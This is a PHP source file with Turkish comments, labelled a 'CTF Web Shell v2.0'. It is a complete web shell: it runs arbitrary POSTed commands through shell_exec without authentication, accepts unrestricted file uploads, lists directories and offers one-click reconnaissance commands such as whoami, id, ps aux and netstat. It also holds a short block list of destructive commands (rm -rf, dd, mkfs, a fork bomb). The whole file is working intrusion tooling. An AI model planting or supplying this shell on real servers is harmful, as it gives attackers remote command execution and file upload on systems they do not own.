<?php
// CTF Web Shell - Enhanced Version
session_start();

// Güvenlik önlemleri - basit filtreleme (CTF için opsiyonel)
function filterCommand($cmd) {
    $dangerous = ['rm -rf', 'dd if=', 'mkfs', ':(){:|:&};:', '> /dev/sda'];
    foreach ($dangerous as $pattern) {
        if (stripos($cmd, $pattern) !== false) {
            return false;
        }
    }
    return $cmd;
}

// Komut geçmişi
if (!isset($_SESSION['cmd_history'])) {
    $_SESSION['cmd_history'] = [];
}

// Çalışma dizini yönetimi
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// Dosya yükleme özelliği
$upload_message = '';
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == UPLOAD_ERR_OK) {
    $upload_dir = $_SESSION['cwd'] . DIRECTORY_SEPARATOR;
    $target_file = $upload_dir . basename($_FILES['upload_file']['name']);
    
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
        $upload_message = "✅ Dosya başarıyla yüklendi: " . htmlspecialchars(basename($_FILES['upload_file']['name']));
    } else {
        $upload_message = "❌ Dosya yükleme başarısız";
    }
}

// Komut işleme
$output = '';
if (!empty($_POST['cmd'])) {
    $raw_cmd = $_POST['cmd'];
    
    // cd komutu için özel işleme
    if (preg_match('/^\s*cd\s+(.+)$/', $raw_cmd, $matches)) {
        $new_dir = trim($matches[1]);
        if ($new_dir == '~') {
            $new_dir = getenv('HOME') ?: '/';
        }
        
        if (is_dir($new_dir)) {
            chdir($new_dir);
            $_SESSION['cwd'] = getcwd();
            $output = "📁 Dizin değiştirildi: " . $_SESSION['cwd'];
        } else {
            $output = "❌ Geçersiz dizin: " . htmlspecialchars($new_dir);
        }
    } else {
        // Komutu filtrele
        $filtered_cmd = filterCommand($raw_cmd);
        
        if ($filtered_cmd === false) {
            $output = "⚠️  Bu komut güvenlik nedeniyle engellendi";
        } else {
            // Komutu geçmişe ekle
            array_push($_SESSION['cmd_history'], [
                'time' => date('H:i:s'),
                'cmd' => $filtered_cmd
            ]);
            
            // Geçmişi sınırla (son 50 komut)
            if (count($_SESSION['cmd_history']) > 50) {
                array_shift($_SESSION['cmd_history']);
            }
            
            // Komutu çalıştır
            $cwd = $_SESSION['cwd'];
            $cmd = "cd " . escapeshellarg($cwd) . " && " . $filtered_cmd . " 2>&1";
            $output = shell_exec($cmd);
            
            if ($output === null) {
                $output = "ℹ️  Komut çalıştırıldı, ancak çıktı üretmedi";
            }
        }
    }
}

// Geçmişi temizleme
if (isset($_POST['clear_history'])) {
    $_SESSION['cmd_history'] = [];
    $output = "🗑️  Komut geçmişi temizlendi";
}

// Dosya/Dizin listeleme (otomatik ls)
$file_list = '';
if ($_SESSION['cwd'] && is_dir($_SESSION['cwd'])) {
    $files = scandir($_SESSION['cwd']);
    $file_list = '<div class="file-list"><h3>📂 ' . htmlspecialchars($_SESSION['cwd']) . '</h3><ul>';
    foreach ($files as $file) {
        if ($file == '.') continue;
        $path = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file;
        $icon = is_dir($path) ? '📁' : '📄';
        $size = is_file($path) ? ' (' . formatSize(filesize($path)) . ')' : '';
        $file_list .= '<li>' . $icon . ' ' . htmlspecialchars($file) . $size . '</li>';
    }
    $file_list .= '</ul></div>';
}

// Boyut formatlama fonksiyonu
function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CTF Web Shell - Enhanced</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: 'Consolas', 'Monaco', monospace;
            color: #00ff00;
            background-color: #000;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 300px;
            gap: 20px;
        }

        .terminal {
            background-color: rgba(0, 20, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }

        .sidebar {
            background-color: rgba(20, 0, 20, 0.8);
            border: 1px solid #ff00ff;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.2);
        }

        h1 {
            color: #00ff00;
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            margin-top: 0;
        }

        h2 {
            color: #ffff00;
            border-bottom: 1px solid #444;
            padding-bottom: 5px;
        }

        h3 {
            color: #ff9900;
            margin-top: 0;
        }

        .form-group {
            display: flex;
            margin-bottom: 20px;
        }

        input[type="text"] {
            flex: 1;
            padding: 12px;
            background-color: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 3px 0 0 3px;
            font-family: 'Consolas', monospace;
        }

        input[type="text"]:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        button {
            padding: 12px 20px;
            background-color: #003300;
            color: #00ff00;
            border: 1px solid #00ff00;
            cursor: pointer;
            transition: all 0.3s;
        }

        button:hover {
            background-color: #006600;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .cmd-btn {
            background-color: #330033;
            color: #ff00ff;
            border-color: #ff00ff;
        }

        .cmd-btn:hover {
            background-color: #660066;
            box-shadow: 0 0 10px rgba(255, 0, 255, 0.5);
        }

        .output {
            background-color: #000;
            color: #00ff00;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 3px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Consolas', monospace;
        }

        .file-list ul {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            padding: 5px 10px;
            margin: 2px 0;
            background-color: rgba(255, 255, 255, 0.05);
            border-radius: 3px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .file-list li:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .quick-commands {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }

        .quick-commands button {
            padding: 8px;
            font-size: 12px;
        }

        .history-item {
            padding: 5px;
            margin: 2px 0;
            background-color: rgba(0, 255, 0, 0.1);
            border-left: 3px solid #00ff00;
            font-size: 12px;
        }

        .upload-form {
            margin-top: 20px;
            padding: 15px;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }

        .upload-form input[type="file"] {
            width: 100%;
            margin-bottom: 10px;
            color: #fff;
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            background-color: #111;
            border-radius: 3px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .alert {
            padding: 10px;
            margin: 10px 0;
            border-radius: 3px;
            background-color: rgba(255, 255, 0, 0.1);
            border-left: 3px solid #ffff00;
        }

        .success {
            background-color: rgba(0, 255, 0, 0.1);
            border-left-color: #00ff00;
        }

        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="terminal">
            <h1>🛡️ CTF Web Shell v2.0</h1>
            
            <div class="status-bar">
                <div>📍 Çalışma Dizini: <strong><?= htmlspecialchars($_SESSION['cwd']) ?></strong></div>
                <div>📊 Geçmiş: <?= count($_SESSION['cmd_history']) ?> komut</div>
            </div>

            <?php if ($upload_message): ?>
                <div class="alert <?= strpos($upload_message, '✅') !== false ? 'success' : '' ?>">
                    <?= $upload_message ?>
                </div>
            <?php endif; ?>

            <h2>⚡ Komut Çalıştır</h2>
            <form method="post">
                <div class="form-group">
                    <input type="text" name="cmd" id="cmd" 
                           value="<?= isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : '' ?>"
                           placeholder="ls -la, pwd, whoami, ..." 
                           autofocus required
                           onkeyup="saveToLocal(this.value)">
                    <button type="submit">🚀 Çalıştır</button>
                    <button type="button" class="cmd-btn" onclick="clearInput()">🗑️ Temizle</button>
                </div>
            </form>

            <div class="quick-commands">
                <button onclick="runCommand('ls -la')">📁 ls -la</button>
                <button onclick="runCommand('pwd')">📍 pwd</button>
                <button onclick="runCommand('whoami')">👤 whoami</button>
                <button onclick="runCommand('id')">🆔 id</button>
                <button onclick="runCommand('uname -a')">💻 uname -a</button>
                <button onclick="runCommand('ps aux')">📊 ps aux</button>
                <button onclick="runCommand('netstat -tulpn')">🌐 netstat</button>
                <button onclick="runCommand('find / -type f -name "*.txt" 2>/dev/null | head -20')">🔍 TXT Bul</button>
            </div>

            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($output)): ?>
                <h2>📤 Çıktı</h2>
                <div class="output" id="output">
                    <?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?>
                </div>
                <button onclick="copyOutput()" style="margin-top: 10px;">📋 Çıktıyı Kopyala</button>
            <?php endif; ?>

            <div class="upload-form">
                <h3>⬆️ Dosya Yükle</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="upload_file" required>
                    <button type="submit">Yükle</button>
                </form>
            </div>
        </div>

        <div class="sidebar">
            <h2>📂 Dosya Listesi</h2>
            <?= $file_list ?>
            
            <h2>📜 Komut Geçmişi</h2>
            <div style="max-height: 300px; overflow-y: auto;">
                <?php foreach (array_reverse($_SESSION['cmd_history']) as $item): ?>
                    <div class="history-item">
                        <small>[<?= $item['time'] ?>]</small><br>
                        <code><?= htmlspecialchars($item['cmd']) ?></code>
                    </div>
                <?php endforeach; ?>
                <?php if (empty($_SESSION['cmd_history'])): ?>
                    <p><small>Henüz komut geçmişi yok</small></p>
                <?php endif; ?>
            </div>
            
            <form method="post" style="margin-top: 20px;">
                <button type="submit" name="clear_history" class="cmd-btn">🗑️ Geçmişi Temizle</button>
            </form>
            
            <h3>🔧 Sistem Bilgisi</h3>
            <div style="font-size: 12px;">
                <p>PHP: <?= phpversion() ?></p>
                <p>Kullanıcı: <?= shell_exec('whoami 2>/dev/null') ?: 'Bilinmiyor' ?></p>
                <p>Sunucu: <?= $_SERVER['SERVER_SOFTWARE'] ?? 'Bilinmiyor' ?></p>
            </div>
        </div>
    </div>

    <script>
        // Otomatik kaydırma
        window.scrollTo(0, document.body.scrollHeight);
        
        // Lokal depolamaya kaydet
        function saveToLocal(cmd) {
            localStorage.setItem('last_cmd', cmd);
        }
        
        // Lokal depolamadan yükle
        window.onload = function() {
            const lastCmd = localStorage.getItem('last_cmd');
            if (lastCmd && !document.getElementById('cmd').value) {
                document.getElementById('cmd').value = lastCmd;
            }
        }
        
        // Hızlı komut çalıştırma
        function runCommand(cmd) {
            document.getElementById('cmd').value = cmd;
            document.querySelector('form').submit();
        }
        
        // Girişi temizle
        function clearInput() {
            document.getElementById('cmd').value = '';
            localStorage.removeItem('last_cmd');
            document.getElementById('cmd').focus();
        }
        
        // Çıktıyı kopyala
        function copyOutput() {
            const output = document.getElementById('output');
            const textArea = document.createElement('textarea');
            textArea.value = output.textContent;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('📋 Çıktı panoya kopyalandı!');
        }
        
        // Klavye kısayolları
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                clearInput();
            }
            if (e.ctrlKey && e.key === 'Enter') {
                e.preventDefault();
                document.querySelector('form').submit();
            }
            // Yukarı/aşağı ok tuşları ile geçmiş
            if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
                e.preventDefault();
                // Geçmiş navigasyonu buraya eklenebilir
            }
        });
    </script>
</body>
</html>
